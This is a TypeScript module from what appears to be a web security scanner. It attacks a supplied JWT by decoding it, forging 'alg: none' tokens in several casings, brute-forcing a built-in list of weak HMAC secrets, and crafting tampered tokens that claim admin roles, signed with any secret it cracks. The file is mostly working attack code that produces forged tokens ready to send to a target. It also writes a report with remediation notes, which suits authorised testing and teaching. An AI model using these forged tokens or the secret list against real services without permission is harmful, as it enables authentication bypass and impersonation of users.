/*---------------------------------------------------------------------------------------------
 *  Copyright (c) HikariSystem. All rights reserved.
 *  Licensed under the GPLv3 License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import * as crypto from 'crypto';
import type { JwtScanResult, VulnFinding } from './types';

const NONE_ALG_VARIANTS = ['none', 'None', 'NONE', 'nOnE'];

const WEAK_SECRETS = [
	'secret', 'password', 'admin', '123456', 'test',
	'development', 'staging', 'your-secret-key', 'jwt-secret',
	'token-secret', 'app-secret', 'super-secret-key', 'AllYourBase',
	'change_me', 'default', 'key', 'mysecret', 'privkey',
	's3cr3t', 'p@ssw0rd', 'abcdef', 'abcdefg', 'abc123', 'qwerty',
	'1234567890', 'secret123', 'jwt_secret', 'my-secret',
	'changeme', 'secretkey', 'supersecret', 'mykey', 'testkey',
	'devkey', 'hmac-secret', 'signing-key', 'auth-secret',
	'token', 'access-secret', 'api-secret', 'secret-key',
	'shared-secret', 'HS256-secret', 'hmackey', 'jwt',
	'example', 'signer', 'keyboard cat', 'iloveyou',
	'passw0rd', '12345678',
];

const CLAIM_TAMPERS: Array<{ label: string; claims: Record<string, unknown> }> = [
	{ label: 'admin=true', claims: { admin: true } },
	{ label: 'role=admin', claims: { role: 'admin' } },
	{ label: 'sub=admin', claims: { sub: 'admin' } },
	{ label: 'iss=attacker', claims: { iss: 'attacker' } },
];

export async function scanJwt(
	token: string,
	options: {
		attacks?: Array<'decode' | 'none-alg' | 'weak-secret' | 'claim-tamper'>;
	} = {}
): Promise<JwtScanResult> {
	const attacks = options.attacks ?? ['decode', 'none-alg', 'weak-secret', 'claim-tamper'];

	const findings: VulnFinding[] = [];
	const start = Date.now();

	// Split token
	const parts = token.split('.');
	if (parts.length !== 3) {
		findings.push({
			type: 'jwt',
			severity: 'info',
			title: 'Invalid JWT Format',
			url: '',
			payload: token,
			evidence: `Token has ${parts.length} parts (expected 3)`,
			confidence: 1.0,
			details: 'The provided string is not a valid JWT. A JWT must consist of three Base64url-encoded parts separated by dots: header.payload.signature.',
		});
		return {
			generatedAt: new Date().toISOString(),
			target: token.length > 40 ? token.substring(0, 40) + '...' : token,
			findings,
			elapsedMs: Date.now() - start,
		};
	}

	// Decode header and payload
	let header: Record<string, unknown>;
	let payload: Record<string, unknown>;

	try {
		header = JSON.parse(base64UrlDecode(parts[0]));
	} catch {
		findings.push({
			type: 'jwt',
			severity: 'info',
			title: 'Malformed JWT Header',
			url: '',
			payload: parts[0],
			evidence: 'Failed to Base64url-decode or JSON-parse the JWT header',
			confidence: 1.0,
			details: 'The JWT header could not be decoded. It should be a valid Base64url-encoded JSON object.',
		});
		return {
			generatedAt: new Date().toISOString(),
			target: token.length > 40 ? token.substring(0, 40) + '...' : token,
			findings,
			elapsedMs: Date.now() - start,
		};
	}

	try {
		payload = JSON.parse(base64UrlDecode(parts[1]));
	} catch {
		findings.push({
			type: 'jwt',
			severity: 'info',
			title: 'Malformed JWT Payload',
			url: '',
			payload: parts[1],
			evidence: 'Failed to Base64url-decode or JSON-parse the JWT payload',
			confidence: 1.0,
			details: 'The JWT payload could not be decoded. It should be a valid Base64url-encoded JSON object.',
		});
		return {
			generatedAt: new Date().toISOString(),
			target: token.length > 40 ? token.substring(0, 40) + '...' : token,
			decoded: { header, payload: {} },
			findings,
			elapsedMs: Date.now() - start,
		};
	}

	const decoded = { header, payload };

	// -----------------------------------------------------------------------
	// Attack 1: Decode (informational)
	// -----------------------------------------------------------------------
	if (attacks.includes('decode')) {
		findings.push({
			type: 'jwt',
			severity: 'info',
			title: 'JWT Decoded',
			url: '',
			payload: token,
			evidence: `Algorithm: ${header.alg ?? 'unknown'}, Type: ${header.typ ?? 'unknown'}`,
			confidence: 1.0,
			details: `Header: ${JSON.stringify(header, null, 2)}\nPayload: ${JSON.stringify(payload, null, 2)}`,
		});

		// Check for missing expiration
		if (!payload.exp) {
			findings.push({
				type: 'jwt',
				severity: 'medium',
				title: 'JWT Missing Expiration Claim',
				url: '',
				payload: token,
				evidence: 'No "exp" claim found in the JWT payload',
				confidence: 0.90,
				details: 'The JWT does not contain an expiration (exp) claim. Tokens without expiration never expire and can be reused indefinitely if compromised.',
			});
		}

		// Check for expired token
		if (typeof payload.exp === 'number' && payload.exp < Math.floor(Date.now() / 1000)) {
			findings.push({
				type: 'jwt',
				severity: 'info',
				title: 'JWT Token Expired',
				url: '',
				payload: token,
				evidence: `Token expired at ${new Date(payload.exp * 1000).toISOString()}`,
				confidence: 1.0,
				details: `The JWT has already expired. Expiration: ${new Date(payload.exp * 1000).toISOString()}.`,
			});
		}
	}

	// -----------------------------------------------------------------------
	// Attack 2: None Algorithm bypass
	// -----------------------------------------------------------------------
	if (attacks.includes('none-alg')) {
		for (const noneVariant of NONE_ALG_VARIANTS) {
			const tamperedHeader = { ...header, alg: noneVariant };
			const tamperedHeaderEncoded = base64UrlEncode(JSON.stringify(tamperedHeader));
			const tamperedToken = `${tamperedHeaderEncoded}.${parts[1]}.`;

			findings.push({
				type: 'jwt',
				severity: 'high',
				title: `JWT None Algorithm Bypass (alg: "${noneVariant}")`,
				url: '',
				payload: tamperedToken,
				evidence: `Forged token with alg="${noneVariant}" and empty signature`,
				confidence: 0.70,
				details: `A token was crafted with the algorithm set to "${noneVariant}" and the signature removed. `
					+ `If the server accepts this token, it means the JWT signature verification can be bypassed entirely. `
					+ `Original algorithm: ${header.alg ?? 'unknown'}. `
					+ `Send this forged token to the application to verify if the bypass works.`,
			});
		}
	}

	// -----------------------------------------------------------------------
	// Attack 3: Weak Secret Bruteforce
	// -----------------------------------------------------------------------
	if (attacks.includes('weak-secret')) {
		const alg = String(header.alg ?? '').toUpperCase();

		if (alg === 'HS256' || alg === 'HS384' || alg === 'HS512') {
			const hashAlg = alg === 'HS256' ? 'sha256' : alg === 'HS384' ? 'sha384' : 'sha512';
			const signingInput = `${parts[0]}.${parts[1]}`;
			const originalSignature = parts[2];

			for (const secret of WEAK_SECRETS) {
				const hmac = crypto.createHmac(hashAlg, secret);
				hmac.update(signingInput);
				const computed = hmac.digest('base64url');

				if (computed === originalSignature) {
					findings.push({
						type: 'jwt',
						severity: 'critical',
						title: 'JWT Signed with Weak Secret',
						url: '',
						payload: secret,
						evidence: `HMAC-${hashAlg.toUpperCase()} signature matches using secret: "${secret}"`,
						confidence: 1.0,
						details: `The JWT is signed with a weak/guessable secret: "${secret}". `
							+ `An attacker who knows this secret can forge arbitrary tokens, impersonate any user, `
							+ `and escalate privileges. The secret should be replaced with a strong, randomly generated value of at least 256 bits.`,
					});
					break; // One match is enough
				}
			}
		} else {
			findings.push({
				type: 'jwt',
				severity: 'info',
				title: 'Weak Secret Test Skipped',
				url: '',
				payload: token,
				evidence: `Algorithm "${header.alg}" is not HMAC-based`,
				confidence: 1.0,
				details: `The JWT uses algorithm "${header.alg}", which is not an HMAC-based algorithm (HS256/HS384/HS512). `
					+ `Weak secret bruteforcing only applies to HMAC-based signatures.`,
			});
		}
	}

	// -----------------------------------------------------------------------
	// Attack 4: Claim Tamper
	// -----------------------------------------------------------------------
	if (attacks.includes('claim-tamper')) {
		for (const tamper of CLAIM_TAMPERS) {
			const tamperedPayload = { ...payload, ...tamper.claims };
			const tamperedPayloadEncoded = base64UrlEncode(JSON.stringify(tamperedPayload));

			// If we found a weak secret, sign with it; otherwise craft unsigned
			const weakSecretFinding = findings.find(
				f => f.title === 'JWT Signed with Weak Secret'
			);

			let tamperedToken: string;
			let note: string;

			if (weakSecretFinding) {
				const secret = weakSecretFinding.payload;
				const alg = String(header.alg ?? '').toUpperCase();
				const hashAlg = alg === 'HS256' ? 'sha256' : alg === 'HS384' ? 'sha384' : 'sha512';
				const signingInput = `${parts[0]}.${tamperedPayloadEncoded}`;
				const hmac = crypto.createHmac(hashAlg, secret);
				hmac.update(signingInput);
				const signature = hmac.digest('base64url');
				tamperedToken = `${signingInput}.${signature}`;
				note = `Signed with discovered weak secret "${secret}".`;
			} else {
				// Craft with none algorithm
				const noneHeader = base64UrlEncode(JSON.stringify({ ...header, alg: 'none' }));
				tamperedToken = `${noneHeader}.${tamperedPayloadEncoded}.`;
				note = 'Unsigned (alg: none). Requires server to accept none algorithm.';
			}

			findings.push({
				type: 'jwt',
				severity: 'high',
				title: `JWT Claim Tamper (${tamper.label})`,
				url: '',
				payload: tamperedToken,
				evidence: `Modified claims: ${JSON.stringify(tamper.claims)}. ${note}`,
				confidence: weakSecretFinding ? 0.95 : 0.60,
				details: `A tampered JWT was crafted with modified claims: ${tamper.label}. `
					+ `${note} `
					+ `If the server accepts this token, an attacker can escalate privileges or impersonate other users. `
					+ `Original payload: ${JSON.stringify(payload)}. `
					+ `Tampered payload: ${JSON.stringify(tamperedPayload)}.`,
			});
		}
	}

	return {
		generatedAt: new Date().toISOString(),
		target: token.length > 40 ? token.substring(0, 40) + '...' : token,
		decoded,
		findings,
		elapsedMs: Date.now() - start,
	};
}

function base64UrlDecode(input: string): string {
	// Replace URL-safe characters and add padding
	let base64 = input.replace(/-/g, '+').replace(/_/g, '/');
	const padLen = (4 - (base64.length % 4)) % 4;
	base64 += '='.repeat(padLen);
	return Buffer.from(base64, 'base64').toString('utf8');
}

function base64UrlEncode(input: string): string {
	return Buffer.from(input, 'utf8')
		.toString('base64')
		.replace(/\+/g, '-')
		.replace(/\//g, '_')
		.replace(/=+$/, '');
}

export function generateJwtReport(result: JwtScanResult): string {
	const lines: string[] = [];
	lines.push('# Scylla Scanner - JWT Attack Report');
	lines.push('');
	lines.push(`- **Target:** \`${result.target}\``);
	lines.push(`- **Findings:** ${result.findings.length}`);
	lines.push(`- **Elapsed:** ${result.elapsedMs} ms`);
	lines.push(`- **Generated:** ${result.generatedAt}`);
	lines.push('');

	if (result.decoded) {
		lines.push('## Decoded Token');
		lines.push('');
		lines.push('### Header');
		lines.push('```json');
		lines.push(JSON.stringify(result.decoded.header, null, 2));
		lines.push('```');
		lines.push('');
		lines.push('### Payload');
		lines.push('```json');
		lines.push(JSON.stringify(result.decoded.payload, null, 2));
		lines.push('```');
		lines.push('');
	}

	if (result.findings.length === 0) {
		lines.push('No JWT vulnerabilities detected.');
	} else {
		for (const f of result.findings) {
			lines.push(`## ${f.title}`);
			lines.push('');
			lines.push(`- **Severity:** ${f.severity.toUpperCase()}`);
			if (f.parameter) {
				lines.push(`- **Parameter:** \`${f.parameter}\``);
			}
			lines.push(`- **Confidence:** ${Math.round(f.confidence * 100)}%`);
			lines.push(`- **Payload:** \`${f.payload}\``);
			lines.push(`- **Evidence:** ${f.evidence}`);
			lines.push('');
			lines.push(f.details);
			lines.push('');
		}
	}

	return lines.join('\n');
}
